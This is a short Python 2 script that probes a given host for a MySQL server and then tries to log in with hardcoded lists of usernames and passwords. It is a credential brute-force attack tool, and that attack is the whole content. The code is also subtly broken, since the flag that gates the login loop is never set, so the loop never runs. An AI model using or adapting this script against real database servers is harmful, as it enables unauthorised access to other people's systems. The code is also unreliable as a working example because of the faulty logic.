#!/usr/bin/env python
import mysql.connector
import sys

argv = sys.argv
host = argv[1]
username = ('root', 'wes', 'wes2', 'admin', 'jonwilson')
password = ('', 'Bacon@123', 'Pancake@123', 'Banana@123', 'NCR')
mysqlconnection = False

print 'Looking for mysql server on {0}'.format(host)
try:
    mydb = mysql.connector.connect(
        host=host,
        user='',
        password='',
        connection_timeout=2
    )
except mysql.connector.errors.ProgrammingError:
    print 'MySql server found! Attempting to login'
except mysql.connector.errors.InterfaceError:
    print 'MySql server not found.'

if mysqlconnection is True:
    for users in username:
        print "Trying to login as {0}".format(users)
        for pw in password:
            try:
                mydb1 = mysql.connector.connect(
                    host=host,
                    user=users,
                    password=pw
                )
                print 'Login succesful using {0} and {1}'.format(users, pw)
            except mysql.connector.errors.ProgrammingError:
                pass


